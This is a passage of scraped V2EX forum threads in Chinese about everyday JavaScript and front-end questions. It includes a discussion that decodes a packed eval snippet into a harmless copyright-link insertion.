{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题</p>\n\n<p>V2 怎么发图啊，直接上地址</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://tsymq.aliapp.com/baidu/\">http://tsymq.aliapp.com/baidu/</a></p>\n\n<p>上传一个视频后缀的文件，点列表，列表里面有个 m3u8 字样的 A 标签按钮点不到</p>\n</div></div>", "<div class=\"topic_content\">测试上传任意文件，改后缀为视频文件即可\r<br>\r<br>有个 class 是 fileContiner ，这个 class 是没有设置样式的\r<br>\r<br>审查工具，去掉 fileContiner ，就能点击 m3u8 按钮\r<br>\r<br>目前我还是不知道问题出在那里\r<br>\r<br>如果能帮忙，不胜感激</div>"], "reply": "15", "tittle": "JavaScript 问题 ， html 点不到 A 标签", "comment": ["困扰我好久了，来个人呐", "那肯定是 A 标签被其他标签遮住了。\r", "\r", "貼代码就要贴到 jsbin / jsfiddler 谢谢。", "进去后里面什么都没有", " 上传一个视频后缀文件", " z-index 层级都是正常的啊，实在不知道什么问题，不然也不会上 V2 了， main.js 不是我写的，这代码压缩过了，看得有点乱。", "还要登陆。。", "还要我百度账户给授权。。。不信任。你可以把后面那部分单独提出来。点不到肯定是被别的东西挡住了。。加个:hover 看看", " 呃，访问 pcs ，只能访问我应用建立的文件，访问不到你的其它数据的\r", "\r", "人呐，快来人呐", "上传了视频 完全找不到你说的什么列表在哪里", " 不好意思，可能我没有表述清楚\r", "\r", "如图所示 ", "双击 m3u8 可以弹出播放器，是不是 js 写错了", "  想帮你都不行啊~", " 单击 a 标签没效果 单击事件", "我传了个 .m4v 还有一个.wmv 都没有那个按钮 只有“下载地址”", " 漏掉了，等会加上，下面都可以，点击名称重命名就行了\r", "\r", "m3u8/m3u/asf/avi/flv/mkv/mov/m4a/3gp/3g2/mj2/mpeg/ts/rm/rmvb/webm/mp4/mpg/"]},
{"content": ["<div class=\"topic_content\">做 web 开发也两年多了，各种组件用的不少，结果发现 dom 还是一知半解，有什么推荐的书籍吗？知识线路是入门-会用-掌握-精通。求大神推荐一条线路。</div>"], "reply": "5", "tittle": "学 dom 入门有什么好的推荐吗？", "comment": ["其实， div 标签、 a 标签还有 canvas 标签可以做出地球上任何网站了", "2 年还一知半解？看红宝书啊《 Javascript 高级程序设计》", "  其他方面精力分散太多。", " canvas 标签都没用过。", "楼主提到了 DOM ，那么如果是指 JS 操作 HTML 而封装的一系列方法以及节点树，那么楼主可以读一读 DOM 相关的书，有很多，比如《 JavaScript DOM 编程艺术》。\r", "\r", "如果楼主说的 DOM 指的其实是 HTML 而与 JS 关联不大，那么楼主可以读一读 W3C 的文档。\r", "\r", "PS 1 楼的同学有误导嫌疑，不要信，不要信，不要信，重要的事情说三遍。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>想做一个芝麻信用展示效果，就是支付宝里面芝麻积分的两个界面，一个是类似仪表盘的效果，第二个就是信用所占比例那个多边形图。</p>\n\n<p>本来很想扒下来的，但是分享之后它就直接生成了图片，没有 URL 地址，所以只能自己写了，请大家支招</p>\n</div></div>"], "reply": "9", "tittle": "想做一个芝麻信用展示效果，请问用什么库比较轻量级且方便", "comment": ["搜搜关键词呗 Spider Chart, Radar Chart", "百度的 echatrs ，\r", "\r", "在下面的仪表盘。", "谢谢提供关键词，看来百度 echarts 能够满足我的要求，只是心里默默祈祷文档别再像地图 api 那么烂了", "chart.js 用起来超级简单", " ?", "第一个仪表盘界面，一丝实现过一个……\r", "svg", " 手机访问，效果感人", "Echarts 用起来好累"]},
{"content": "", "reply": "7", "tittle": "各位最近有没有想入手的前端书籍？", "comment": ["这段时间没新书吧~\r", "\r", "前短时间入了 js 高级程序设计，感觉比犀牛好很多啊，相见恨晚~", " 犀牛本身是工具书，高程设计是讲思路，两本书定位不一样", "有个《你不知道的 JavaScript 》好像很不错", "\r", "\r", "想买这两本书，太贵了", " ", " 第二本直接有完整在线版", "有类似 cookbook 经典特效案例的靠谱书籍吗，纯 js 讲解，解决兼容、内存泄露、代码冗余等问题。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近试用atom，除了启动稍慢，其他方面挺爽的，不过atom有没有自动补全javascript代码的插件？新手学习javascript表示经常输错代码。</p>\n</div></div>"], "reply": "8", "tittle": "atom 有没有 javascript 的代码补全插件？", "comment": ["自带的 autocomplete-plus 插件会提供基于字符串模糊查询的补全；如果需要基于静态分析的补全，可以安装 atom-ternjs 这个插件，ternjs 是最好的 JavaScript 静态分析器之一。\r", "\r", "官方博客上介绍自动补全的文章： ", "\r", "以及这是我翻译的中文版：  ", "\r", "\r", "欢迎关注 Atom 中文社区： ", "无。", "//i.v2ex.co/KB1r6888.png\r", "//i.v2ex.co/frASJwfI.png\r", "//i.v2ex.co/Wqy00fg5.png", "\r", "\r", " 精子同学，thx！＝。＝，强烈建议你改个网名，太标新立异了...", " 强烈建议你保持这个网名，标新立异才体现出人的价值！人就是为创造而生的！", "Atom autocomplete for modules.\r", "javascript-snippets"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>或者远程办公的</p>\n</div></div>"], "reply": "1", "tittle": "北京有比较好的 part-time 的 Web 前端工作吗?", "comment": ["dd"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>菜鸟一枚，不明白下面这两段代码为什么会输出不同的结果</p>\n<div class=\"highlight\"><pre>var yun = new Object ()\nyun.name = \"bai\";\nyun.age = 199;\n\nfunction showPro (obj ) {\n    var result = \"\";\n    for (var clone in obj )\n            result = clone + \"=\" + obj[clone];\n        }\n    }\n    return result;\n}\nconsole.log (showPro (yun ));    // age=99\n\n\nfunction showPro (obj ) {\n    var result = \"\";\n    for (var clone in obj )\n            result += clone + \"=\" + obj[clone];\n        }\n    }\n    return result;    // name=bai age=199\n}\n</pre></div>\n</div></div>"], "reply": "14", "tittle": "遇到一个 JavaScript 运算符的问题", "comment": ["+= 和=的区别吧？", "第一个函数里是重新赋值\r", "第二个函数里是累加赋值", " \r", " \r", "\r", "我只是不明白为什么第二个函数里的  result += clone + \"=\" + obj[clone];\r", "\r", "我的理解是 result 不是空字符串吗？", "```\r", "var yun = new Object ()\r", "yun.name = \"bai\";\r", "yun.age = 199;\r", "\r", "function showPro (obj ) {\r", "    var result = \"\";\r", "    for (var clone in obj )\r", "            result = clone + \"=\" + obj[clone];\r", "        }\r", "    }\r", "    return result;\r", "}\r", "console.log (showPro (yun ));    // age=199\r", "\r", "\r", "function showPro (obj ) {\r", "    var result = \"\";\r", "    for (var clone in obj )\r", "            result += clone + \"=\" + obj[clone];\r", "        }\r", "    }\r", "    return result;    // name=bai age=199\r", "}\r", "```", "第一次是空的，第二次不是空的。\r", "那是个 for 循环啊。", "a+=b 就是 a = a + b\r", "循环里面 += ，就是每次都拼接新的在原来后面", "= 就是无视原来的 重新赋值了", " \r", "\r", "Thanks", "重新看一下 C 语言的语法。", " Why?", "个人理解的代码：\r", "    var yun ={};\r", "    yun.name = \"bai\";\r", "    yun.age = 199;\r", "    function showPro (obj ) {\r", "        var result = \"\";\r", "        for (var clone in obj ){\r", "            result = clone + \"=\" + obj[clone];//把等号右边计算后的值赋给等号左边的变量；记得 for-in 枚举出来的顺序是混乱的；枚举出来值的是第一次枚举出来的数值；\r", "        }\r", "        return result;\r", "    }\r", "    function showPro2 (obj ) {\r", "        var result = \"\";\r", "        for (var clone in obj ){\r", "            //result += clone + \"=\" + obj[clone];//可以转化成下面一行的代码\r", "            //result = result +(clone + \"=\" + obj[clone]);//这句和上面一句一样的；\r", "\r", "            //下面两句和上面一行是一样的；\r", "            result= (\"age\" + \"=\" + \"199 \");//分解的第一步。值等于第一次枚举\r", "            var result2=(\"name\" + \"=\" +\"bai \")+result;//分解的第二部，值等于第二次枚举的值+第一次枚举出来的值；\r", "        }\r", "        return result2;\r", "    }\r", "    console.log (showPro (yun ));    // age=99\r", "    console.log (showPro2 (yun ));   // name=bai age=199", "你试试 result=result+clone+\"=\"+obj[clone];", "第一个是循环里每次都重新赋值，所以最后一次有限\r", "第二个是循环里每次往 result 结尾+数据，所以是所有属性的结果。", "有限=》有效"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><code>eval (function (p,a,c,k,e,d ){e=function (c ){return (c&lt;a?\"\":e (parseInt (c/a )))+((c=c%a )&gt;35?String.fromCharCode (c+29 ):c.toString (36 ))};if (!''.replace (/^/,String )){while (c--)d[e (c )]=k[c]||e (c );k=[function (e ){return d[e]}];e=function (){return'\\\\w+'};c=1;};while (c--)if (k[c])p=p.replace (new RegExp ('\\\\b'+e (c )+'\\\\b','g'),k[c]);return p;}('o[\"\\\\v\\\\3\\\\b\\\\r\\\\s\\\\1\\\\9\\\\0\"][\"\\\\q\\\\5\\\\p\\\\0\\\\1\\\\4\\\\9\"](\"\\\\u\\\\f\\\\t\\\\m\\\\a\\\\8\\\\7 \\\\e\\\\5\\\\1\\\\n\\\\c\\\\\"\\\\e\\\\0\\\\0\\\\g\\\\a\\\\/\\\\/\\\\2\\\\2\\\\d\\\\h\\\\i\\\\3\\\\g\\\\1\\\\h\\\\b\\\\9\\\\/\\\\\" \\\\0\\\\7\\\\5\\\\i\\\\1\\\\0\\\\c\\\\\"\\\\C\\\\2\\\\4\\\\7\\\\9\\\\D\\\\\" \\\\d\\\\0\\\\E\\\\4\\\\1\\\\c\\\\\"\\\\b\\\\3\\\\4\\\\3\\\\5\\\\a\\\\z\\\\k\\\\k\\\\l\\\\l\\\\j\\\\j\\\\A\\\\\" \\\\6\\\\8\\\\2\\\\6\\\\y\\\\w\\\\f\\\\x\\\\F\\\\B\\\\8\\\\/\\\\2\\\\6\\\\8\\\\/\\\\7\\\\6\");',42,42,'x74|x65|x62|x6f|x6c|x72|x3e|x61|x3c|x6e|x3a|x63|x3d|x73|x68|u6e90|x70|x2e|x67|x30|x33|x36|u4f9b|x66|window|x69|x77|x75|x6d|u63d0|u8d44|x64|u6251|u7801|u72d7|x23|x3b|u533a|x5f|x6b|x79|u793e'.split ('|'),0,{}))</code></p>\n</div></div>"], "reply": "17", "tittle": "这段恶心的 js 代码，有人可以解释下吗？", "comment": ["只是插入一个版权链接", "window[\"document\"][\"writeln\"](\"资源提供:<a href=\\\"http:\\/\\/bbs.gope.cn\\/\\\" target=\\\"_blank\\\" style=\\\"color:#336600;\\\" ><b>狗扑源码社区<\\/b><\\/a>\");", "document.writeln ('资源提供:<a href=\"http://bbs.gope.cn/\" target=\"_blank\" style=\"color:#336600;\" ><b>狗扑源码社区</b></a>');", "packed 加密，直接把 eval 去掉，然后在控制台里运行一遍就能解密了。", "哈哈，楼主下载了盗版的代码！", " \r", " \r", " \r", " \r", " 我知道如何运行结果，就不知道他怎么加密的，他的原理是什么？", "｀ t=\"36164,28304,25552,20379,65306,60,97,32,104,114,101,102,61,34,104,116,116,112,58,47,47,98,98,115,46,103,111,112,101,46,99,110,47,34,32,116,97,114,103,101,116,61,34,95,98,108,97,110,107,34,32,62,60,102,111,110,116,32,99,111,108,111,114,61,34,114,101,100,34,62,29399,25169,28304,30721,31038,21306,60,47,102,111,110,116,62,60,47,97,62\"\r", "t=eval (\"String.fromCharCode (\"+t+\")\");\r", "document.write (t );｀\r", "这一段也是。。。。", " eval 不是么", " ", " 谢谢，懂了。但是加密原理不懂，这个涉及到算法吗？", "  String.fromCharCode", "\r", "选中 Base62 encode 后压缩的代码就是 \r", "eval (function (p,a,c,k,e,r )......这样的\r", "\r", "具体代码实现在，自己看吧\r", "\r", "30 行: _base62Encode 方法", " 楼主可以去 pack 项目的官网看看，我记得还有 php 版的", "\r", "\r", "这里还有卖萌的，不过兼容性没那么好", "怎么样解码？", "到今天终于知道楼主问这段代码的目的了：破解并出售", " 错了，不是这样的额。我这个是威客的单子，别人让我把这个给他去掉。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>用户打开的页面是一个内网页面，有没有办法在这个内网页面里实现一个网络探测？即用户打开这个内网页面后，基于 javascript 启动一个异步的网络探测，用于判断当前终端设备是否可访问网络（或某外网 url 可访问），然后把结果再发会给内网 web server ？<br>\n之前实现了一个通过一个外网图片是否可加载成功来判断，但有缓存的问题。<br>\n网上也找了个 javascript ping 的实现，但不精准，网络不通的情况下有误判。<br>\n有没有大牛指点方法？谢谢！</p>\n</div></div>"], "reply": "6", "tittle": "如何在前端通过 javascript 判断某个 url 可访问（网络是否通）？", "comment": ["图片有缓存的话，在图片路径后面加一个 timestamp 或者随机数就能刷新缓存啦。", "你既然已经用了图片, 图片地址后面加 timestamp", "Get 设置一个超时不就可以了", "这就是做传说中的信息安全机制么", "不知道下面这篇文章是否能够解决你的问题：\r", "\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>背景：<br>\n        在做一个 Citrix 虚拟化项目问题，在虚拟化使用过程中有用户提出有应用系统在物理机中速度正常，在虚拟化环境中登陆需要几十秒，然后就安排工程师去跟踪排查问题，最后说原因定位到了“ WebUIValidation.js ”，看了一下，确实诡异，搞不明白，求助！！！</p>\n\n<p>现象：<br>\n        1 、在物理机中登录 http 抓包如下：<br>\n<img src=\"http://ww2.sinaimg.cn/large/55fc1144jw1ew6rgxjxzyj210k0bs794.jpg\" alt=\"\"><br>\n        可以看到， assofflogin.aspx 之行后就开始加载图片了。<br>\n        2 、在虚机中登陆，结果就变了，在 assofflogin.aspx 之后会执行 WebUIValidation.js ，这个 js 第一次加载 90%情况下会失败，持续时间 20 秒左右。之后会出现多种可能性：<br>\n        1.1 、第一次失败后，反复尝试 3-5 次，一直失败，然后不执行 js ，直接开始加载图片；<br>\n        1.2 、失败几次后，会成功执行 WebUIValidation.js 后，加载图片；<br>\n        1.3 、极其个别的情况下 WebUIValidation.js 会一次执行通过；或者，与物理机情况一直，没有执行这个 js 。<br>\n<img src=\"http://ww4.sinaimg.cn/large/55fc1144jw1ew6rrgleluj211q04njto.jpg\" alt=\"\"><br>\n<img src=\"http://ww4.sinaimg.cn/large/55fc1144jw1ew6rrzkhn7j213k0bvgr0.jpg\" alt=\"\"><br>\n<img src=\"http://ww1.sinaimg.cn/large/55fc1144jw1ew6rsn3ddgj211g073q5x.jpg\" alt=\"\"></p>\n\n<p>可以确定的就是： WebUIValidation.js 导致了在虚拟化环境中登陆慢的问题。<br>\n最初怀疑是 WebUIValidation.js 在服务器中没有这个文件，但是在 IE 中用完整路径尝试后，是可以下载到这个 js 的，并不是 404 什么。<br>\n所以，不明白的是：<br>\n1 、为什么在物理机登陆不需要执行此 js ？<br>\n2 、为什么在虚拟化环境中登陆，会出现很多的可能性，当然 js 反复执行多次后还是没有回包的情况最多；<br>\n3 、此系统运维商找不到人，服务器在北京，现在的情况是，找不到运维的、开发的，也暂时没法接触到服务器（正在协调找人）；<br>\n4 、用户的态度是：物理机正常，虚拟化环境有问题，那就是你虚拟化的问题，你们就要排查清楚😭</p>\n\n<p>求高人指点，已经要崩溃了。</p>\n\n<p>以下是与 WebUIValidation.js 有关的代码片段：</p>\n<div class=\"highlight\"><pre>&lt;/HEAD&gt;\n    &lt;body MS_POSITIONING=\"GridLayout\" BGCOLOR=\"#ffffff\" leftmargin=\"0\" topmargin=\"0\"&gt;\n        &lt;form name=\"index99\" method=\"post\" action=\"assofflogin.aspx\" language=\"javascript\" onsubmit=\"if (!ValidatorOnSubmit ()) return false;\" id=\"index99\"&gt;\n&lt;input type=\"hidden\" name=\"__VIEWSTATE\" value=\"dDwtMjEzNTk2MDUwODt0PDtsPGk8MT47PjtsPHQ8O2w8aTwxNT47PjtsPHQ8QDA8Ozs7Ozs7Ozs7Oz47Oz47Pj47Pj47bDxMb2dpbjs+Pn2zs1WO22R8mQ8wwaoOGEQS/SHk\" /&gt;\n\n&lt;script language=\"javascript\" type=\"text/javascript\" src=\"/aspnet_client/system_web/1_1_4322/WebUIValidation.js\"&gt;&lt;/script&gt;\n\n\n            &lt;TABLE WIDTH=\"777\" BORDER=\"0\" CELLPADDING=\"0\" CELLSPACING=\"0\" align=\"center\"&gt;\n                &lt;TR&gt;\n                    &lt;TD colspan=\"3\"&gt;\n                        &lt;table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\"&gt;\n</pre></div>\n</div></div>"], "reply": "2", "tittle": "有关 WebUIValidation.js 的一个诡异问题，求大神出手解救", "comment": ["随手搜 WebUIValidation.js ，发现这东西跟.net 相关的\r", "\r", "\r", "The WebUIValidation.js file, as you know, contains client-side JavaScript functions for client-side validation. It is automatically injected into a page when:\r", "\r", "The page contains one or more validation Web controls.\r", "The page is being visited by an “ uplevel ” browser.\r", "\r", "根据以上信息，这个东西是有条件加载的，我猜你遇到的问题是物理机上符合不加载的条件，虚拟环境符合加载条件但加载遇到困难。\r", "\r", "最好还是问写这个服务的工程师吧。", " 嗯，这个 js 看名字就应该是校验用途。\r", "虚拟环境中如果连续刷新，会出现某一次不执行 js 的情况，也会出现 5 次执行不过去就丢弃不执行的情况。\r", "大多数情况是，执行 2-3 次，收到回包，执行通过。\r", "现在的难题在于：找不到写这个服务的码农了，运维的人都很难找到。\r", "如果能接触到服务器，我倒是想尝试注释了这句话看看结果。"]},
{"content": ["<div class=\"topic_content\">代码贴这里，谢谢！\r<br>\r<br><a target=\"_blank\" href=\"http://pastebin.com/zyfZJ2G7\" rel=\"nofollow\">http://pastebin.com/zyfZJ2G7</a></div>"], "reply": "16", "tittle": "求大神帮忙解码这段恶意代码隐藏了什么内容", "comment": ["把 eval 改成 alert 在浏览器 F12 的终端里输进去", " 1 楼正解。 2 楼沾光。", " 谢谢！输出的结果在这里，请帮忙看下这事什么鬼：\r", "\r", " \r", "输出的结果在这里，请帮忙看下这事什么鬼： \r", "\r", "我平板上打不开 @", "jquery 1.2.2", " 是呀，你知道是什么东西来不？", " 全站 Reset ？", " 知道这恶意病毒干啥来的？", "[FuckAdBlock]\r", "F12 一堆。。。", " 能不能全都贴出到 pastebin 上，谢谢！", " 你理解错了，我是说，那个站 F12 里输出了好多这玩意。。。", "你需要这个\r", "6 楼说的，这段就是 jquery 1.2.2 的源码，什么而已代码啊。。。囧，楼主你自己对比一下\r", "\r", "CNM 的 GFW 把 pastebin 也墙了啊", "不错，对付 AdBlock 用 FuckAdBlock\r", "牛人~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>众所周知， ExtJS 2.0.2 之后授权由 LGPL 改成 GPL 。<br>\n采用 GPL ，意味之不能免费商用。<br>\n我想的问是，为什么没有基于 ExtJS 2.0.2 的 LGPL 衍生项目，以便可以继续免费商用？<br>\n难道是因为大家认为 GPL 也可以免费商用吗？</p>\n\n<p>因为我认为 ExtJS 是优秀的框架，想在某些商业项目中使用。</p>\n\n<p>表达比较简练，意思达到就行。</p>\n</div></div>"], "reply": "10", "tittle": "关于 ExtJS 的 GPL 授权和 LGPL 衍生项目", "comment": ["既然商用，为什么不买商业授权？", "感觉是因为已经没什么人用 ExtJS 了", " 不买商业授权自然是有原因，比如资金紧张，所以寻找 LGPL 、 Apache 这样的免费商用授权。", "GPL 意味之不能免费商用？", "Dojo 吧", " 商用闭源。不想说这么多，所以我最后一句说“表达比较简练，意思达到就行\"。", " 那是另一个话题。我想知道的是，为什么 ExtJS 没有出现 LGPL 分支？比如， MySQL 出现了 MariaDB 分支； OpenOffice 出现了 LibreOffice 分支。或许有，我没找到？如果没有，难道 ExtJS 的市场不行？", "赞 采用 GPL ，意味之不能免费商用。", " 对，市场不行，至少和你说的那 2 货比根本不在一个级别，你可以换用 easyui 之类的东西", "EXTJS 5 和 6 的 UI 感觉都很带感啊。。。\r", "无奈 LICENSE  囊中羞涩"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前在做一个项目的前端研发，开发了两个前端的模块，但是每个模块是一个单独的入口页面，而且两个模块的 css 还有部分冲突，怎么可以将两个单页入口整合为一个？</p>\n</div></div>"], "reply": "7", "tittle": "angularjs 如果有两个单页怎么整合？", "comment": ["router? 我瞎说的，我也刚开始看 Angular ，下个月就要用到项目上了", "angularjs 本来就是单页，把 2 个单页整合成一个，把不同的那部分取出来，做一个选项卡选择？", " 两个模块都用了 router...不知道怎么整合起来", " 主要是因为之前沟通上的一点失误，两个模块的 css 好多是基于 body ，有冲突，不知怎么整合比较好", "搞个 Iframe?", " 有这个想法，现在试一下...", "css 部分先解耦，然后用 ng-template 导入看看。"]},
{"content": ["<div class=\"topic_content\">很多开放的 api 在调用的时候需要对参数做 md5 或 sha 的签名。\r<br>签名的第一步通常是对所有参数排序，然后拼接成一个串，再计算签名。\r<br>这一步有没有比较好的解决方案呢？多谢。</div>"], "reply": "4", "tittle": "javascript 的排序问题", "comment": ["不是按顺序取出来拼接么 ", " ", "基本都是 key 名字典排序吧", "我见过的都是字母排序， sort() 即可。\r", "params = {\r", "  b: 3,\r", "  a: 2\r", "}\r", "\r", "Object.keys(params).sort().map(function(key) {\r", "  return encode...(key) + '=' + encode...(params[key])\r", "}).join('&')", " 多谢啊，初入 javascript 服务器端，还不熟悉，是我想复杂了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在还只有基本功能，只测试了 ws ，不知道其他协议支持不。。本来是 Chrome 的扩展的，但是双币信用卡还在申请，不然付不了开发者费用就不能上传，不过目前的功能都是浏览器里的 js 实现的，还没有涉及到 Chrome 的 API ，所以也可以直接在网页里用。</p>\n\n<p>要是哪位大侠提供个 logo 就好了，现在在网上随便找了个图凑合。也不知道侵权木有。</p>\n\n<p>传送门： <a target=\"_blank\" rel=\"nofollow\" href=\"http://crysislinux.github.io/smart_websocket_client/\">http://crysislinux.github.io/smart_websocket_client/</a></p>\n</div></div>", "<div class=\"topic_content\">类似于 postman 一类的工具， postman 是测试 http 的，这个是测试 websocket 的\r<br>\r<br>涉及到的类库和开发工具：\r<br>react 、 alt 、 react-ace\r<br>webpack\r<br>\r<br>贴个图\r<br><a target=\"_blank\" href=\"http://i.imgur.com/VUcGU7e.jpg\"><img src=\"http://i.imgur.com/VUcGU7e.jpg\" border=\"0\" style=\"max-width: 660px;\" class=\"imgly\"></a></div>"], "reply": "3", "tittle": "做了个测试 websocket 的工具，欢迎大家提提意见完善一下", "comment": ["你说了一堆话，却只字未提这个工具的具体功能。我相信这才是大多数人关心的", " 就是测试 websocket 啊，很简单的功能，连接发消息，很明显吧", " 我错了。。附加了个图，这下应该比较清楚了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有个单页应用 , 主程一直在用一个 js 文件在做, 就是程序都写在那个.js 文件里.<br>\n我想加入这个页面的工作, 上头的人不让我加入.<br>\n我觉得用文件比对的方式是可以加入项目的. 两个人做各自的部份, 在用文件比对的方式调整代码.</p>\n\n<p>入职一个月,写了很多东西全被扔掉.</p>\n</div></div>"], "reply": "11", "tittle": "如何加入别人的项目", "comment": ["为什么只写一个 js 文件，不用模块化么？", " 密度高 , 复杂度高, 像 PPT 制作那样的", "那个 js 是用 gulp 之类压缩出来的吧？他本地应该是有模块化？坐等前端来回答", "所有的版本控制软件都可以轻松完成你说的文件比对，这根本就不是问题，我觉得你是不是没搞清真正不让你加入的原因", " 是啊, 是不清楚我的能力, 还是不放心我, 怕越做越乱", "一个应用只有一个 js 文件？你确定不是打包构建之后的？要么是这个应用非常非常简单，要么是主程不懂组件化、模块化，要么他压根就没想别人加入。你挑一个理由吧 = =", "“入职一个月,写了很多东西全被扔掉.” 是怎么回事？", " \r", " \r", "我看 svn , 他常改的文件有, 一个.css 一个 .htm 一个.js  就三个文件\r", "其中, .js 文件五百多行了, 他做了一星期了吧\r", "\r", "我觉得他在架构上没有针对性设计 , 直接用他原本写框架的面向对向格式 . \r", "是不是可以说他不懂架构设计.", "前端 如果不分模块, 就是一个巨坑, 坑人坑后人", "只有一个 js 文件的项目，看来编程习惯也不咋地，这种项目不加入也罢", "500 行一个文件还好啦，耦合度高不拆也可以"]},
{"content": ["<div class=\"topic_content\">求指点</div>"], "reply": "6", "tittle": "请问如何把页面下拉(点住页面不放，下拉，然后松开),添加一个 DIV", "comment": ["或者有什么现成的 js 库可以调用", "\r", "你要的是这种吗？类似下拉刷新的效果？", " \r", "\r", "对的，很类似。\r", "但是如何下拉添加一个层呢", "或者添加了 DIv,然后等关闭了 DIV 之后再刷新", "iscroll", "百度下弹性滚动？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>后面对数据的处理，每次 for 循环得考虑取到的是字符串，不能直接进行+运算，好麻烦</p>\n\n<p>当然可以定义一个函数循环遍历字符串数组，转换成数值数组<br>\n然而我偷懒，只在调用的时候先做减法运算后进行加法，只是这样容易疏漏</p>\n\n<p>这种情况有什么更好的处理办法呢？</p>\n</div></div>"], "reply": "13", "tittle": "js 用 split()拆分测试数据（内容为数字），有直接的方法将得到的字符串数组转换成整型/浮点型数组吗？", "comment": ["numberStringArray\r", "__.map (function (numberString ) {\r", "____return parseFloat (numberString );\r", "__})\r", "__.forEach (function (number ) {\r", "____// balabalabala}\r", "__})\r", "\r", "下划线都换成空格", " 感谢\r", "这些数组方法我还没接触过，比我自定义 for 循环遍历简洁多了", " 原来还可以这么回复代码！见识了", " 这些方法都是 ES5 新增的, 现代一点的浏览器都没问题, IE9 以下估计会有问题, 可以用 ", "  或者 ", " 代替\r", "\r", "详细的浏览器兼容可以到 ", " 查看各个方法里的 Browser compatibility", "要求一个值的话 map 后 reduce 就好了", "补一个简洁的 array.map (parseFloat )", " parseFloat 可以这用么，但是 parseInt 千万不可。", " parseInt 会接受两个参数， parseFloat 只接受一个。", " 在这个 es6 都要到来的时代就不要管 es5 都不支持的浏览器了吧……\r", "当然真要支持挂一个 es5shim 好了， es5 大多数功能都支持。", "用  underscore 把，浏览器的 API 向来不如第三方", "浏览器兼容性太折腾了，我是用 lodash 的 map", "字符串也可以直接进行加减乘除啊   \r", "+'12'  ===  12\r", "+'12.233' === 12.233\r", "\r", "~~'12.233' === 12\r", "~~'12.999' === 12\r", "\r", "2333 + +'666' === 2999\r", "2333 + '666 === '2333666'", " \r", "虽然表意不准确，运算与字符串拼接的区别还是明显的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><div class=\"highlight\"><pre><span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"exp-about exp-left-block\"</span><span class=\"nt\">&gt;</span>\n     <span class=\"nt\">&lt;p</span> <span class=\"na\">class=</span><span class=\"s\">\"exp-left-pagh\"</span><span class=\"nt\">&gt;</span>声明与条款<span class=\"nt\">&lt;/p&gt;</span>\n    <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"exp-over-upright\"</span><span class=\"nt\">&gt;&lt;/div&gt;</span>\n<span class=\"nt\">&lt;/div&gt;</span>\n\n<span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"exp-change-log exp-left-block\"</span><span class=\"nt\">&gt;</span>\n     <span class=\"nt\">&lt;p</span> <span class=\"na\">class=</span><span class=\"s\">\"exp-left-pagh\"</span><span class=\"nt\">&gt;</span>更改日志<span class=\"nt\">&lt;/p&gt;</span>\n     <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"exp-over-upright\"</span><span class=\"nt\">&gt;&lt;/div&gt;</span>\n<span class=\"nt\">&lt;/div&gt;</span>\n\n<span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"exp-other exp-left-block\"</span><span class=\"nt\">&gt;</span>\n     <span class=\"nt\">&lt;p</span> <span class=\"na\">class=</span><span class=\"s\">\"exp-left-pagh\"</span><span class=\"nt\">&gt;</span>赞助商<span class=\"nt\">&lt;/p&gt;</span>\n     <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"exp-over-upright\"</span><span class=\"nt\">&gt;&lt;/div&gt;</span>\n<span class=\"nt\">&lt;/div&gt;</span>\n</pre></div>\n\n<p>JS 和 HTML 无关</p>\n<div class=\"highlight\"><pre><span class=\"kd\">function</span> <span class=\"nx\">add3Events</span><span class=\"p\">(){</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">var</span> <span class=\"nx\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nx\">i</span> <span class=\"o\">&lt;</span> <span class=\"nx\">bar_list</span><span class=\"p\">.</span><span class=\"nx\">length</span><span class=\"p\">;</span> <span class=\"nx\">i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">bar_list</span><span class=\"p\">[</span><span class=\"nx\">i</span><span class=\"p\">].</span><span class=\"nx\">onclick</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">num</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n\n        <span class=\"k\">return</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n         <span class=\"c1\">// 点击改变 css</span>\n          <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">getElementsByTagName</span><span class=\"p\">(</span><span class=\"s1\">'div'</span><span class=\"p\">)[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"nx\">style</span><span class=\"p\">.</span><span class=\"nx\">display</span> <span class=\"o\">=</span> <span class=\"s1\">'block'</span><span class=\"p\">;</span>\n          <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">style</span><span class=\"p\">.</span><span class=\"nx\">backgroundColor</span> <span class=\"o\">=</span> <span class=\"s1\">'#00A2CA'</span><span class=\"p\">;</span>\n          <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">style</span><span class=\"p\">.</span><span class=\"nx\">color</span> <span class=\"o\">=</span> <span 